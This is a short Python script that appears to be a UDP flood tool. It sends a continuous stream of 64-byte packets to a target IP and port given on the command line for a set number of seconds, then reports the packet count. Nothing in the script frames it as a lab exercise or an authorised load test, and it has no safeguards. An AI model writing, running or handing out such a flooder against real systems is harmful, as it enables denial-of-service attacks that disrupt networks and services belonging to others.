import socket, time, sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10

end_time = time.time() + duration
count = 0
while time.time() < end_time:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"X" * 64, (target_ip, target_port))
        s.close()
        count += 1
    except Exception:
        pass
print(f"Sent {count} packets to {target_ip}:{target_port} over {duration}s")
